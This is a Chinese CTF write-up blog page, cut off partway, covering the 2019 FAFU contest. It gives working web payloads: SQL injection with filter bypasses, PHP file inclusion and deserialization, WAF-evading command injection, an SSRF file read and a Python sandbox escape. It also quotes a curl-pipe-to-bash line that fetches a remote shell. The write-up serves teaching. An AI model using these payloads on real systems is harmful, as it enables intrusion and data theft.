@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>2019-FAFU-ctf WP | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019-FAFU-ctf WP">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/10503/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-20T01:29:45.705Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019-FAFU-ctf WP">
+<meta name="twitter:description" content="ctf">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">2019-FAFU-ctf WP</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#签到"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">签到</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#login1"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">login1</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sqli"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">sqli</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#黑曜石浏览器"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">黑曜石浏览器</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#login2"><span class="post-toc-number">1.0.5.</span> <span class="post-toc-text">login2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Blog"><span class="post-toc-number">1.0.6.</span> <span class="post-toc-text">Blog</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#fakebook"><span class="post-toc-number">1.0.7.</span> <span class="post-toc-text">fakebook</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#misc"><span class="post-toc-number">2.</span> <span class="post-toc-text">misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#字符偏移"><span class="post-toc-number">2.0.1.</span> <span class="post-toc-text">字符偏移</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sandbox"><span class="post-toc-number">2.0.2.</span> <span class="post-toc-text">sandbox</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#图片隐写"><span class="post-toc-number">2.0.3.</span> <span class="post-toc-text">图片隐写</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#reverse"><span class="post-toc-number">3.</span> <span class="post-toc-text">reverse</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#patch"><span class="post-toc-number">3.0.1.</span> <span class="post-toc-text">patch</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#c-STL"><span class="post-toc-number">3.0.2.</span> <span class="post-toc-text">c++STL</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#crypto"><span class="post-toc-number">4.</span> <span class="post-toc-text">crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#sha256"><span class="post-toc-number">4.0.1.</span> <span class="post-toc-text">sha256</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#DES"><span class="post-toc-number">4.0.2.</span> <span class="post-toc-text">DES</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pwn"><span class="post-toc-number">5.</span> <span class="post-toc-text">pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#001"><span class="post-toc-number">5.0.1.</span> <span class="post-toc-text">001</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#002"><span class="post-toc-number">5.0.2.</span> <span class="post-toc-text">002</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-2019-FaFu-ctf-Writeup"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">2019-FAFU-ctf WP</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-29 15:15:00" datetime="2019-04-29T07:15:00.000Z"  itemprop="datePublished">2019-04-29</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">20</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>第一次办校赛，不得不说问题出现还是挺多的，没考虑到太多人出现平台卡和网络卡的问题，不过办比赛还是学到挺多的<a id="more"></a></p>
+<p>所有题目都已经传到github上面了：<a href="https://github.com/Foxgrin/2019-Fafu-ctf" target="_blank" rel="noopener">https://github.com/Foxgrin/2019-Fafu-ctf</a> </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>得到flag的条件：<code>md5($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])</code></p>
+<p>考察的是md5和sha1函数无法处理数组的特性，处理结果都是NULL</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure>
+<p>flag：<code>flag{WelCome_To_Fafu_2019_ctf}</code></p>
+<h4 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h4><p>扫描目录发现存在<strong>.git泄露</strong></p>
+<p>使用<strong>githack</strong>进行还原即可</p>
+<p>还原后发现flag文件：<code>{975fdb8c8c79c7c9502834c1baf02b36}</code></p>
+<h4 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h4><p>提示：<code>id is not in whitelist.</code></p>
+<p>猜测注入点在参数<code>id</code>，GET传参<code>id=1</code>得到回显信息</p>
+<p>经过fuzz测试，题目通过黑名单的方式过滤了<code>or</code>，<code>union</code>，<code>*</code>，<code>benchmark</code>，<code>sleep</code>，<code>if</code>，<code>case</code></p>
+<p>无法使用联合注入，盲注，但是报错注入函数<code>extractvalue</code>和<code>updatexml</code>都未被过滤</p>
+<p>尝试payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,concat(0x3a,database(),0x3a))%23</span><br></pre></td></tr></table></figure>
+<p>发现<code>concat</code>又被过滤了，但是可以用<code>make_set</code>函数来代替</p>
+<p>注数据库名payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,database()))%23</span><br></pre></td></tr></table></figure>
+<p>数据库名：<code>web</code></p>
+<p>因为这里<code>or</code>被过滤了，所以无法使用<code>information_schema</code>库得到表名和列名</p>
+<p>猜测列名flag在表名flag中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,make_set(3,&apos;~&apos;,(select flag from flag)))%23</span><br></pre></td></tr></table></figure>
+<p>得到flag：<code>flag{1n0rRY_i3_Vu1n3rab13}</code></p>
+<h4 id="黑曜石浏览器"><a href="#黑曜石浏览器" class="headerlink" title="黑曜石浏览器"></a>黑曜石浏览器</h4><p>抓包发现响应包头部字段藏有提示字段：<code>hint: include($_GET[&quot;file&quot;])</code></p>
+<p>提示考察文件包含，使用php伪协议读取index.php源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">	header(<span class="string">'hint:include($_GET["file"])'</span>);</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'heicore.html'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$pass = unserialize($pass);</span><br><span class="line">		<span class="keyword">echo</span> $pass;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>file_get_contents</code>函数同样用伪协议<code>php://input</code>利用</p>
+<p>源代码中还给了提示文件<code>class.php</code>，同样方法读取源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现是一个Read类，其中魔术方法<code>__toString</code>在当对象被当做字符串时候会自动调用，调用后会执行<code>file_get_contents</code>函数读取文件，结合<code>class.php</code>中的反序列化函数<code>unserialize</code>，我们可以构造对象的序列化字符来读取<code>f1a9.php</code>文件</p>
+<p>构造序列化字符的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = <span class="keyword">new</span> Read();</span><br><span class="line">$r-&gt;file = <span class="string">"f1a9.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($r);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到的序列化字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=class.php&amp;user=php://input&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: 172.31.19.47</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: _ga=GA1.1.1968814565.1555932724; _gid=GA1.1.1377480033.1555932724</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure>
+<h4 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h4><p>密码字段过滤了<code>&#39;</code>，<code>#</code>，<code>||</code>，<code>or</code></p>
+<p>在用户名字段尝试<code>admin&#39;#</code>，回显的信息为：<code>Wrong username / password.</code></p>
+<p>尝试<code>admin&#39; or 1#</code>，回显的信息为：<code>Wrong password for users</code></p>
+<p>回显的信息不同，猜测用户名<code>admin</code>其实是不存在的，并且后台还对我们输入的密码进行了验证</p>
+<p><code>admin&#39; union select 1,2#</code>，回显信息：<code>Wrong password for 1</code></p>
+<p>有注入点，开始常规注入，数据库名为<code>fafuctf</code>，表名为<code>users</code>，列名为<code>username,password</code></p>
+<p>注password：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(password),2 from users#&amp;password=1</span><br></pre></td></tr></table></figure>
+<p>password：<code>8235020a76bf2f8e3e30c500c3f309220d26c544</code></p>
+<p>同样的方法注出用户名为：<code>users</code></p>
+<p>尝试登陆但是失败，观察密码字段</p>
+<p>猜测密码字段经过加密，从40位字符可以猜到是<code>sha1</code>加密，结合前面的分析，可以猜测出，后台进行的密码验证为<code>$row[&#39;password&#39;] === sha1($_POST[&#39;password&#39;])</code></p>
+<p>我们可以通过union构造password字段的查询值，所以最终payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select 1,sha1(2)#&amp;password=2</span><br></pre></td></tr></table></figure>
+<p>flag：<code>flag{SqLi_InjEc4ion_Is_So_E@Sy}</code></p>
+<h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4><p>扫描后台发现存在备份文件<code>www.zip</code></p>
+<p>审计源码，网站目录如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">html tree</span><br><span class="line">.</span><br><span class="line">├── passage</span><br><span class="line">│ ├── title.php</span><br><span class="line">│ ├── words.php</span><br><span class="line">├── templates</span><br><span class="line">│ ├── About.php</span><br><span class="line">│ ├── Flag.php</span><br><span class="line">│ ├── Link.php</span><br><span class="line">│ ├── passage.php</span><br><span class="line">├── class.php</span><br><span class="line">├── index.php</span><br><span class="line">├── waf.php</span><br></pre></td></tr></table></figure>
+<p>审计源码</p>
+<p>在index.php中，发现可以通过参数<code>$_GET[&#39;page&#39;]</code>执行命令，但是该参数经过waf和<code>file_exists</code>的过滤处理，</p>
+<p>所以无法通过<code>$_GET[&#39;page&#39;]</code>函数执行命令</p>
+<p>另外发现了反序列化函数，猜测可以构建类，正好根目录下存在文件<code>class.php</code></p>
+<p>跟踪<code>class.php</code>，虽然同样有waf，但是可以绕过，最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?page=Passge&amp;tip=php://input&amp;tips=O:4:&quot;Blog&quot;:1:&#123;s:4:&quot;file&quot;;s:26:&quot;%26/bin/ca?%09./templates/Flag&quot;;&#125; HTTP/1.1</span><br><span class="line">Host: 172.31.19.53</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">you got this</span><br></pre></td></tr></table></figure>
+<p>这个payload其实使用了统配符来绕过WAF，在linux下，/bin/ca? 相当于/bin/cat 。由于过滤了符号 ‘&lt;’ 和空格，所以无法使用 cat ./templates/Flag ，但是我们可以使用%09（Tab）来替换空格，绕过WAF。</p>
+<p>另外要注意的是<code>file</code>值<code>%26/bin/ca?%09./templates/Flag</code>的长度，<code>%26</code>会被URL解码为<code>&amp;</code>，<code>%09</code>会被解码会<code>Tab</code>，所以<code>%26</code>和<code>%09</code>长度都相当于1</p>
+<p>赛后从福大师傅那里得知单引号能绕过黑名单过滤<code>ca&#39;&#39;t</code>，他们给的payload是<code>tips=O:4:&quot;Blog&quot;:1:{s:4:&quot;file&quot;;s:18:&quot;%;c&#39;&#39;at%09./waf.php;&quot;;}</code></p>
+<p>另外福大师傅还有<code>;cu&#39;&#39;rl\$IFS\$9{x.x.x.x}|bash;</code>直接拿shell的方法</p>
+<h4 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h4><p>注册信息后，在<code>view.php</code>页面，发现url存在参数<code>no</code>存在sql注入，过滤了<code>union select</code>，采用<code>/**/</code>代替空格</p>
+<ul>
+<li>注库：<code>?no=0%20union/**/select%201,database(),3,4</code></li>
+<li>注表：<code>?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()</code></li>
+<li>注列：<code>?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27</code></li>
+<li>注data：<code>?no=0%20union/**/select%201,data,3,4%20from%20users</code></li>
+</ul>
+<p>发现data是一串序列化字符串，并且给出了类的所有信息，结合页面<code>age</code>和<code>blog</code>字段无法显示以及反序列化函数报错信息，猜测后台将<code>data</code>信息取出进行了反序列化处理，并且，在页面下方通过<code>iframe</code>标签将博客页面访问出来，说明可能利用了php的<code>curl</code>扩展对我们注册的博客信息进行请求，并将请求获得的页面内容通过<code>iframe</code>标签显示出来，说明可能存在<code>SSRF</code>漏洞，其原理与读取文件类似，我们通过报错信息知道了网站的绝对目录，便可以利用<code>file</code>协议进行读取任意文件，但是要注意需要序列化处理</p>
+<p>最终获得flag的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=0%20union/**/select%201,data,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;%27%20from%20users</span><br></pre></td></tr></table></figure>
+<p>将得到的页面内容进行base64解密后获得flag</p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="字符偏移"><a href="#字符偏移" class="headerlink" title="字符偏移"></a>字符偏移</h4><p>考察 Linux 文件重定向  <code>flag{You_F0und_4_Supr1s3_1n_These_Bug5:)}</code></p>
+<ul>
+<li><p>环境部署：</p>
+<p>1.服务端运行 <code>python server.py</code>， 并修改 client.c 中的 ip 和 port<br>2.编译 <code>gcc client.c -o bugProgram</code> 并下发</p>
+</li>
+<li><p>题解：</p>
+<ol>
+<li>./bugProgram 1&gt;/dev/null 即可得到 flag</li>
+<li>也可以 wireshark 抓取流量, 再分析程序流程还原 flag</li>
+</ol>
+</li>
+</ul>
+<h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>考察 Python3 沙盒绕过    <code>flag{Awes0me_Pyth0n_&amp;_Aw3s0me_Cl4ss}</code></p>
+<ul>
+<li>环境部署：<ol>
+<li>修改 flag 权限防止搅屎 <code>chmod o-w flag.txt</code></li>
+<li>服务端执行 <code>socat tcp-listen:8999,fork exec:&quot;./run.sh&quot;,stderr</code></li>
+<li>做题通过 <code>nc ip 8999</code></li>
+</ol>
+</li>
+<li>题解：<ul>
+<li>Fuzz 之后发现限制了 import system os bash sh 等关键字, 使用 Python 内建函数以及类的继承绕过限制, 执行 cat flag.txt. Payload:<br><code>print(&#39;&#39;.&#39;&#39;.__class__.__mro__[1].__subclasses__()[93].__init__.__globals__[&#39;sys&#39;].modules[&#39;o&#39;+&#39;s&#39;].spawnlp(0, &#39;cat&#39;, &#39;cat&#39;, &#39;flag&#39;))</code><br>其中 <code>__subclasses__()[93]</code> 是 <code>&lt;class &#39;codecs.StreamReaderWriter&#39;&gt;</code> 的索引， 视具体情况而定<br><code>s = &#39;&#39;.__class__.__mro__[1].__subclasses__()</code><br><code>for i in s: print(str(i) + &#39; &#39; + str(s,index(i)))</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h4><p>考察png的基本格式<br>首先把图片开头的几个nop删掉，然后得到图片<br>之后修改图片宽度，得到写有flag的图片<br>python脚本如下：</p>
